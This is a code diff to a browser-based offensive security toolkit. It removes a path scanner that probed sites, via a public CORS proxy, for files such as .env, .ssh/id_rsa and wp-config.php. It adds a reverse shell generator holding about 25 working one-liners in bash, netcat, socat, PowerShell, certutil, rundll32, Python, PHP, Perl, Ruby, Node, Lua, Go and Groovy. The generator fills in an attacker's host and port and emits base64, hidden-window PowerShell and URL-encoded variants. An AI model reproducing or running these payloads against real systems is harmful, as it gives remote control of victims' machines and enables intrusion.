@@ -252,7 +252,7 @@ body {
   <button id="tab-url" class="tb-btn" onclick="switchTab('url')">encoder</button>
   <button id="tab-ip" class="tb-btn" onclick="switchTab('ip')">ip lookup</button>
   <button id="tab-osint" class="tb-btn" onclick="switchTab('osint')">osint hub</button>
-
+  <button id="tab-rshells" class="tb-btn" onclick="switchTab('rshells')">reverse shells</button>
   <button id="tab-exploit" class="tb-btn" onclick="switchTab('exploit')">exploit search</button>
   <div class="tb-sep"></div>
   <button id="new-note-btn" class="tb-btn" onclick="newNote()">+ note</button>
@@ -406,37 +406,35 @@ body {
 	  </div>
 	</div>
 
-        <div id="active-panel" style="flex: 1; display: none; flex-direction: column; gap: 20px; padding: 20px 24px; overflow-y: auto; background: var(--bg0);">
-          <div style="border-bottom: 1px solid var(--border); padding-bottom: 15px;">
-            <h2 style="color: var(--red); font-size: 18px;">Active Reconnaissance</h2>
-            <p style="font-size: 12px; color: var(--text2);">Direct interaction tools. Note: These actions are visible in server logs. May result in false positives.</p>
-          </div>
+	<div id="rshells-panel" style="flex: 1; display: none; flex-direction: column; gap: 20px; padding: 20px 24px; overflow-y: auto; background: var(--bg0);">
+  
+	  <div style="border-bottom: 1px solid var(--border); padding-bottom: 15px;">
+	    <h2 style="color: var(--red); font-size: 18px;">Reverse Shell Generator</h2>
+	    <p style="font-size: 12px; color: var(--text2);">Dynamic execution sequences. Alter parameters below to rewrite all reverse shells simultaneously.</p>
+	  </div>
 
-          <div style="display: flex; flex-direction: column; gap: 12px; background: var(--bg1); padding: 18px; border-radius: 8px; border: 1px solid var(--border);">
-            <div style="display: flex; gap: 12px; align-items: center;">
-              <input type="text" id="active-input" placeholder="Enter target domain (e.g. example.com)..." style="flex: 1; background: var(--bg2); border: 1px solid var(--border); color: var(--text0); padding: 12px 15px; border-radius: 6px; outline: none;">
-      
-              <button class="tb-btn btn-purple" style="padding: 12px 25px; height: 44px; border-color: var(--red) !important;" onclick="runActiveScanner()">
-                  Start Path Discovery
-              </button>
-            </div>
-    
-            <div style="display: flex; align-items: center; gap: 10px; border-top: 1px dashed var(--border); padding-top: 12px; margin-top: 4px;">
-              <span style="font-size: 11px; color: var(--text1);">Wordlist:</span>
-              <button class="tb-btn" style="font-size: 11px; padding: 4px 12px;" onclick="document.getElementById('wordlist-file').click()">
-                Load Custom File (.txt)
-              </button>
-              <input type="file" id="wordlist-file" accept=".txt" style="display:none" onchange="loadCustomWordlist(event)">
-              <span id="wordlist-status" style="font-size: 11px; color: var(--text2); font-family: monospace;">Default list loaded (15 paths)</span>
-            </div>
-          </div>
+	  <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 12px; background: var(--bg1); padding: 18px; border-radius: 8px; border: 1px solid var(--border);">
+	    <div style="display: flex; flex-direction: column; gap: 4px;">
+ 	     <label style="font-size: 11px; color: var(--text1); font-weight: bold;">LHOST (Attacker IP)</label>
+  	    <input type="text" id="rs-lhost" value="10.10.10.10" oninput="updateReverseShells()" style="background: var(--bg2); border: 1px solid var(--border); color: var(--text0); padding: 8px 12px; border-radius: 4px; outline: none; font-family: monospace;">
+ 	   </div>
+  	  <div style="display: flex; flex-direction: column; gap: 4px;">
+   	   <label style="font-size: 11px; color: var(--text1); font-weight: bold;">LPORT (Attacker Port)</label>
+   	   <input type="text" id="rs-lport" value="4444" oninput="updateReverseShells()" style="background: var(--bg2); border: 1px solid var(--border); color: var(--text0); padding: 8px 12px; border-radius: 4px; outline: none; font-family: monospace;">
+  	  </div>
+ 	 </div>
 
-          <div id="active-content">
-            <div id="scanner-results" style="display: flex; flex-direction: column; gap: 8px; font-family: monospace; font-size: 12px;">
-                <div class="url-tip">Results will appear here once the scan begins.</div>
-            </div>
-          </div>
-        </div>
+ 	 <div style="display: flex; gap: 20px; align-items: flex-start;">
+ 	   <div style="width: 160px; display: flex; flex-direction: column; gap: 6px;">
+  	    <button class="tb-btn" id="rs-btn-all" onclick="filterReverseShells('all')" style="width:100%; text-align:left;">All Shells</button>
+   	   <button class="tb-btn" id="rs-btn-linux" onclick="filterReverseShells('linux')" style="width:100%; text-align:left;">Linux / Bash</button>
+   	   <button class="tb-btn" id="rs-btn-windows" onclick="filterReverseShells('windows')" style="width:100%; text-align:left;">Windows / PS</button>
+   	   <button class="tb-btn" id="rs-btn-script" onclick="filterReverseShells('script')" style="width:100%; text-align:left;">Scripting Engines</button>
+  	  </div>
+
+  	  <div id="reverse-shells-container" style="flex: 1; display: flex; flex-direction: column; gap: 16px;"></div>
+ 	 </div>
+	</div>
 
     </div>
 
@@ -510,129 +508,230 @@ const osintSources = {
     ]
 };
 
-async function probePath(domain, path) {
-    try {
-        // 1. Clean the domain input (remove trailing slashes and hash symbols)
-        let cleanDomain = domain.split('#')[0].replace(/\/+$/, '');
-        if (!cleanDomain.startsWith('http')) {
-            cleanDomain = `https://${cleanDomain}`;
-        }
+const shellBlueprints = [
+    // LINUX
+    { 
+        name: "Bash /dev/tcp Connection", 
+        cat: "linux", 
+        tmpl: "bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1" 
+    },
+    { 
+        name: "Bash Netcat FIFO Pipe Relay", 
+        cat: "linux", 
+        tmpl: "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {LHOST} {LPORT} >/tmp/f" 
+    },
+    { 
+        name: "Bash UDP Connection", 
+        cat: "linux", 
+        tmpl: "sh -i >& /dev/udp/{LHOST}/{LPORT} 0>&1" 
+    },
+    { 
+        name: "Socat Interactive PTY", 
+        cat: "linux", 
+        tmpl: "socat tcp-connect:{LHOST}:{LPORT} exec:\"bash -li\",pty,stderr,setsid,sigint,sane" 
+    },
+    { 
+        name: "Bash Dual-Directional Pipe", 
+        cat: "linux", 
+        tmpl: "bash -i 5<>/dev/tcp/{LHOST}/{LPORT} 0<&5 1>&5 2>&5" 
+    },
+    { 
+        name: "Netcat OpenBSD (No -e parameter option)", 
+        cat: "linux", 
+        tmpl: "mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | nc {LHOST} {LPORT} > /tmp/s; rm /tmp/s" 
+    },
+    { 
+        name: "Awk Network Stream Injection", 
+        cat: "linux", 
+        tmpl: "awk 'BEGIN {s = \"/inet/tcp/0/{LHOST}/{LPORT}\"; while(1) { printf \"shell> \" |& s; s |& getline c; if (c == \"exit\") close(s); while ((c |& getline) > 0) print $0 |& s; close(c) }}'" 
+    },
+    { 
+        name: "Telnet Dual-Relay Connection", 
+        cat: "linux", 
+        tmpl: "mknod /tmp/backpipe p; telnet {LHOST} {LPORT} 0</tmp/backpipe | /bin/shX 1>/tmp/backpipe 2>/tmp/backpipe" 
+    },
 
-        // 2. Clean the path input (remove leading slashes)
-        const cleanPath = path.replace(/^\/+/, '');
-        const targetUrl = `${cleanDomain}/${cleanPath}`;
+    // WINDOWS
+    { 
+        name: "PowerShell IEX Web Download", 
+        cat: "windows", 
+        tmpl: "powershell -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://{LHOST}/run.ps1')\"" 
+    },
+    { 
+        name: "Windows ConPty Shell (nc alternative)", 
+        cat: "windows", 
+        tmpl: "powershell -nop -w hidden -c \"$c=New-Object System.Net.Sockets.TCPClient('{LHOST}',{LPORT});$t=New-Object System.Threading.Thread({while($true){try{$d=(New-Object System.IO.StreamReader($c.GetStream())).ReadLine();if($d -eq 'exit'){$c.Close();break};iex $d | Out-String | %{(New-Object System.IO.StreamWriter($c.GetStream())).WriteLine($_);(New-Object System.IO.StreamWriter($c.GetStream())).Flush()}}catch{break}});$t.Start()\"" 
+    },
+    { 
+        name: "PowerShell Interactive Reverse", 
+        cat: "windows", 
+        tmpl: "$c=New-Object System.Net.Sockets.TCPClient('{LHOST}',{LPORT});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$t=($r+'PS '+(pwd).Path+'> ');$x=([text.encoding]::ASCII).GetBytes($t);$s.Write($x,0,$x.Length);$s.Flush()};$c.Close()" 
+    },
+    { 
+        name: "Windows cmd.exe Netcat Executable", 
+        cat: "windows", 
+        tmpl: "nc.exe {LHOST} {LPORT} -e cmd.exe" 
+    },
+    { 
+        name: "PowerShell System.Net WebClient Loop", 
+        cat: "windows", 
+        tmpl: "$s=New-Object System.Net.Sockets.TCPClient('{LHOST}',{LPORT});$b=New-Object System.Byte[] 1024;while(($i=$s.GetStream().Read($b,0,$b.Length)) -ne 0){$d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$i);try{$o=(iex $d 2>&1 | Out-String)}catch{$o=$_.Exception.Message};$p=[Text.Encoding]::ASCII.GetBytes($o);$s.GetStream().Write($p,0,$p.Length)}" 
+    },
+    { 
+        name: "Windows Certutil Memory Execution Bypass", 
+        cat: "windows", 
+        tmpl: "certutil.exe -urlcache -split -f http://{LHOST}/shell.exe %TEMP%\\shell.exe && %TEMP%\\shell.exe" 
+    },
+    { 
+        name: "Windows Rundll32 JavaScript Execution Vector", 
+        cat: "windows", 
+        tmpl: "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();h=new%20ActiveXObject(\"WScript.Shell\");h.Run(\"powershell.exe%20-nop%20-w%20hidden%20-c%20IEX%20(new-object%20net.webclient).downloadstring('http://{LHOST}/s.ps1')\",0)" 
+    },
 
-        // 3. Define the CORS proxy
-        // Using a public demo instance of cors-anywhere for explanation:
-        const proxyUrl = 'https://cors-anywhere.herokuapp.com/';
-        
-        // Remove 'mode: no-cors' so we can actually inspect the response status!
-        const response = await fetch(proxyUrl + targetUrl, { 
-            method: 'GET',
-            headers: {
-                'X-Requested-With': 'XMLHttpRequest'
-            },
-            cache: 'no-cache'
-        });
-        
-        // Now we can read the exact code because the proxy bypasses the CORS wall
-        return { path, status: response.status, url: targetUrl };
-    } catch (e) {
-        return { path, status: 'CONN_ERR', url: '' };
+    // SCRIPTING ENGINES
+    { 
+        name: "Python3 Interactive PTY Shell", 
+        cat: "script", 
+        tmpl: "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{LHOST}\",{LPORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn(\"/bin/bash\")'" 
+    },
+    { 
+        name: "PHP Socket Execution Loop", cat: "script", tmpl: "php -r '$sock=fsockopen(\"{LHOST}\",{LPORT});exec(\"/bin/sh -i <&3 >&3 2>&3\");'" 
+    },
+    { 
+        name: "Ruby Socket Connection", 
+        cat: "script", 
+        tmpl: "ruby -rsocket -e 'f=TCPSocket.open(\"{LHOST}\",{LPORT}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'" 
+    },
+    { 
+        name: "Perl Socket Relay", 
+        cat: "script", 
+        tmpl: "perl -e 'use Socket;$i=\"{LHOST}\";$p={LPORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'" 
+    },
+    { 
+        name: "NodeJS Interactive Stream", 
+        cat: "script", 
+        tmpl: "node -e 'const net = require(\"net\"), cp = require(\"child_process\"); const cl = new net.Socket(); cl.connect({LPORT}, \"{LHOST}\", () => { const sh = cp.spawn(\"/bin/sh\", [\"-i\"]); cl.pipe(sh.stdin); sh.stdout.pipe(cl); sh.stderr.pipe(cl); });'" 
+    },
+    { 
+        name: "Perl Linux Clean Reverse", 
+        cat: "script", 
+        tmpl: "perl -MIO::Socket -e '$p=fork;exit,if($p);$c=IO::Socket::INET->new(PeerAddr=>\"{LHOST}:{LPORT}\");STDIN->fdopen($c,\"r\");$~->fdopen($c,\"w\");STDOUT->fdopen($c,\"w\");STDERR->fdopen($c,\"w\");system(\"/bin/sh -i\");'" 
+    },
+    { 
+        name: "Perl Windows Native (cmd.exe) Relay", 
+        cat: "script", 
+        tmpl: "perl -MIO::Socket -e '$c=IO::Socket::INET->new(PeerAddr=>\"{LHOST}:{LPORT}\");STDIN->fdopen($c,\"r\");$~->fdopen($c,\"w\");STDOUT->fdopen($c,\"w\");STDERR->fdopen($c,\"w\");system(\"cmd.exe\");'" 
+    },
+    { 
+        name: "Lua Socket Module Execution Loop", 
+        cat: "script", 
+        tmpl: "lua -e 'local socket = require(\"socket\"); local tcp = socket.tcp(); tcp:connect(\"{LHOST}\", \"{LPORT}\"); while true do local cmd, err = tcp:receive(); if err then break end; local f = io.popen(cmd, \"r\"); local out = f:read(\"*a\"); f:close(); tcp:send(out); end'" 
+    },
+    { 
+        name: "Golang Standalone Reverse Source", 
+        cat: "script", 
+        tmpl: "echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"{LHOST}:{LPORT}\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go" 
+    },
+    { 
+        name: "Groovy / Java Class Loader Wrapper", 
+        cat: "script", 
+        tmpl: "groovy -e 'String host=\"{LHOST}\";int port={LPORT};String cmd=\"/bin/sh\";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try{p.exitValue();break;}catch(Exception e){}}p.destroy();s.close();'" 
     }
-}
-
-// This will hold whatever paths we are currently scanning against
-let activeDiscoveryList = [
-    'config.php', '.htaccess', 'sitemap.xml', 'wp-config.php', '.env', '.git/config', 
-    'phpinfo.php', 'backup.sql', 'admin/', 'login.php', 'wp-admin',
-    '.ssh/id_rsa', 'api/v1', 'server-status'
 ];
 
-// Handles reading the text file line by line
-function loadCustomWordlist(event) {
-    const file = event.target.files[0];
-    if (!file) return;
+let activeShellCat = 'all';
 
-    const reader = new FileReader();
-    reader.onload = function(e) {
-        const text = e.target.result;
+function updateReverseShells() {
+    const lhost = document.getElementById('rs-lhost').value.trim() || '10.10.10.10';
+    const lport = document.getElementById('rs-lport').value.trim() || '4444';
+    
+    const targetBox = document.getElementById('reverse-shells-container');
+    targetBox.innerHTML = '';
+
+    shellBlueprints.forEach((bp, idx) => {
+        if (activeShellCat !== 'all' && bp.cat !== activeShellCat) return;
+
+        // 1. Generate the clean, true RAW layout string with user variables replaced
+        let raw = bp.tmpl.replace(/{LHOST}/g, lhost).replace(/{LPORT}/g, lport);
         
-        // Split by lines, trim spaces, and filter out empty lines or comments starting with #
-        const lines = text.split(/\r?\n/)
-                          .map(line => line.trim())
-                          .filter(line => line.length > 0 && !line.startsWith('#'));
-
-        if (lines.length === 0) {
-            alert("The selected file didn't contain any valid paths.");
-            return;
+        let b64Output = "";
+        
+        // 2. Specialized encoding routine for the Base64 Tab
+        if (bp.cat === "windows" && bp.name.includes("PowerShell")) {
+            // Windows PowerShell requires specialized UTF-16LE translation for its internal execution engine
+            try {
+                const buf = new Uint16Array(raw.length);
+                for (let i = 0; i < raw.length; i++) { buf[i] = raw.charCodeAt(i); }
+                const psB64Blob = btoa(String.fromCharCode.apply(null, new Uint8Array(buf.buffer)));
+                // Wrap it directly inside the executable terminal instruction block
+                b64Output = `powershell -nop -w hidden -e ${psB64Blob}`;
+            } catch(e) { b64Output = "ERROR_GENERATING_ENCODING"; }
+        } else {
+            // Standard terminal wrapper for Linux, Mac, and interpreter languages
+            let standardB64 = btoa(raw);
+            b64Output = `echo ${standardB64} | base64 -d | bash`;
         }
 
-        // Clean up leading slashes because probePath prepends it dynamically
-        activeDiscoveryList = lines.map(line => line.startsWith('/') ? line.substring(1) : line);
+        // 3. Simple URL encoding for web exploitation pathways
+        let url = encodeURIComponent(raw);
+
+        const card = document.createElement('div');
+        card.style.cssText = "background: var(--bg1); border: 1px solid var(--border); border-radius: 6px; padding: 14px; display: flex; flex-direction: column; gap: 8px;";
         
-        // Update UI Status indicator
-        document.getElementById('wordlist-status').textContent = `Custom list loaded (${activeDiscoveryList.length} paths)`;
-        document.getElementById('wordlist-status').style.color = 'var(--green)';
-    };
-    
-    reader.readAsText(file);
-}
-
-const commonLeaks = [
-    'config.php', '.htaccess', 'sitemap.xml', 'wp-config.php', '.env', '.git/config', 
-    'phpinfo.php', 'backup.sql', 'admin/', 'login.php', 'wp-admin',
-    '.ssh/id_rsa', 'api/v1', 'server-status'
-];
-
-async function runActiveScanner() {
-    const domain = document.getElementById('active-input').value.trim();
-    const resultsContainer = document.getElementById('scanner-results');
-    
-    if (!domain) return;
-    
-    resultsContainer.innerHTML = '<div style="color: var(--accent); margin-bottom: 10px;">Scanning target (Showing custom filtered status codes)...</div>';
-
-    // Loop through your paths list (activeDiscoveryList if you added the wordlist feature)
-    const pathsToScan = typeof activeDiscoveryList !== 'undefined' ? activeDiscoveryList : commonLeaks;
-
-    for (const path of pathsToScan) {
-        const result = await probePath(domain, path);
-        
-        // FILTER: Only show successful hits (200) or explicit authentication blocks (403/401)
-        if (result.status === 200 || result.status === 403 || result.status === 401) {
-            const item = document.createElement('div');
-            
-            // Color code the status badge
-            const badgeColor = result.status === 200 ? 'var(--green)' : 'var(--red)';
-            
-            item.style.cssText = "display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid var(--bg2); padding: 10px; background: rgba(255,255,255,0.02); border-radius: 4px; margin-bottom: 6px;";
-            
-            item.innerHTML = `
-                <div style="display: flex; flex-direction: column; gap: 2px;">
-                    <div style="display: flex; align-items: center; gap: 8px;">
-                        <span style="background: ${badgeColor}; color: #fff; font-size: 10px; padding: 2px 6px; border-radius: 3px; font-weight: bold;">${result.status}</span>
-                        <span style="color: var(--text0); font-weight: bold; font-size: 13px;">/${path}</span>
-                    </div>
-                    <span style="color: var(--text2); font-size: 10px; font-family: monospace;">${result.url}</span>
+        card.innerHTML = `
+            <div style="display:flex; justify-content:space-between; align-items:center;">
+                <span style="font-size:13px; font-weight:bold; color:var(--text0);">${bp.name}</span>
+                <span style="font-size:10px; background:var(--bg2); color:var(--text1); padding:2px 6px; border-radius:4px; text-transform:uppercase; font-family:monospace;">${bp.cat}</span>
+            </div>
+            <div style="border:1px solid var(--border); border-radius:4px; background:var(--bg0); overflow:hidden; display:flex; flex-direction:column;">
+                <div style="display:flex; background:var(--bg2); border-bottom:1px solid var(--border);">
+                    <button class="tb-btn" style="border:none; border-radius:0; font-size:11px; padding:6px 12px; background:var(--bg0); color:var(--accent);" onclick="toggleShellEnc(this,'raw',${idx})">Raw Code</button>
+                    <button class="tb-btn" style="border:none; border-radius:0; font-size:11px; padding:6px 12px; background:transparent;" onclick="toggleShellEnc(this,'b64',${idx})">Base64 Wrapper</button>
+                    <button class="tb-btn" style="border:none; border-radius:0; font-size:11px; padding:6px 12px; background:transparent;" onclick="toggleShellEnc(this,'url',${idx})">URL Encoded</button>
                 </div>
-                <a href="${result.url}" target="_blank" class="tb-btn btn-purple" 
-                   style="text-decoration: none; padding: 4px 12px; font-size: 11px; white-space: nowrap;">
-                   Visit ↗
-                </a>
-            `;
-            
-            resultsContainer.appendChild(item);
-            
-            const activePanel = document.getElementById('active-panel');
-            activePanel.scrollTop = activePanel.scrollHeight;
-        }
-    }
+                <div style="display:flex; align-items:center; padding:10px; gap:10px;">
+                    <code id="s-str-${idx}" style="flex:1; font-family:monospace; font-size:12px; color:var(--purple); white-space:pre-wrap; word-break:break-all;" data-raw="${escapeHtml(raw)}" data-b64="${escapeHtml(b64Output)}" data-url="${url}">${escapeHtml(raw)}</code>
+                    <button class="tb-btn" style="font-size:11px; padding:4px 10px;" onclick="copyShellText('s-str-${idx}', this)">Copy</button>
+                </div>
+            </div>
+        `;
+        targetBox.appendChild(card);
+    });
+}
 
-    const doneMsg = document.createElement('div');
-    doneMsg.style.cssText = "color: var(--text2); font-size: 11px; margin-top: 15px; text-align: center; border-top: 1px dashed var(--border); padding-top: 10px;";
-    doneMsg.innerText = "Scan complete.";
-    resultsContainer.appendChild(doneMsg);
+function toggleShellEnc(btn, enc, idx) {
+    Array.from(btn.parentElement.children).forEach(b => { b.style.background = 'transparent'; b.style.color = ''; });
+    btn.style.background = 'var(--bg0)';
+    btn.style.color = 'var(--accent)';
+    
+    const el = document.getElementById(`s-str-${idx}`);
+    el.innerText = el.getAttribute(`data-${enc}`);
+}
+
+function filterReverseShells(cat) {
+    activeShellCat = cat;
+    updateReverseShells();
+}
+
+function copyShellText(id, btn) {
+    navigator.clipboard.writeText(document.getElementById(id).innerText).then(() => {
+        const txt = btn.innerText; btn.innerText = "Copied!";
+        btn.style.borderColor = "var(--green)";
+        setTimeout(() => { btn.innerText = txt; btn.style.borderColor = ""; }, 1000);
+    });
+}
+
+function escapeHtml(str) {
+    return String(str).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
+}
+
+// Intercept tab changes to execute internal renderer
+const originalTabSwitcher = switchTab;
+switchTab = function(targetTab) {
+    originalTabSwitcher(targetTab);
+    if (targetTab === 'rshells') {
+        updateReverseShells();
+    }
 }
 
 function executeOsint() {
@@ -931,7 +1030,7 @@ function switchTab(tab) {
   currentTab = tab;
 
   // List every tab key you have
-  const tabs = ['notes', 'url', 'ip', 'osint', 'active', 'exploit'];
+  const tabs = ['notes', 'url', 'ip', 'osint', 'exploit', 'hash', 'rshells'];
 
   tabs.forEach(t => {
       // 1. Handle Button Styling
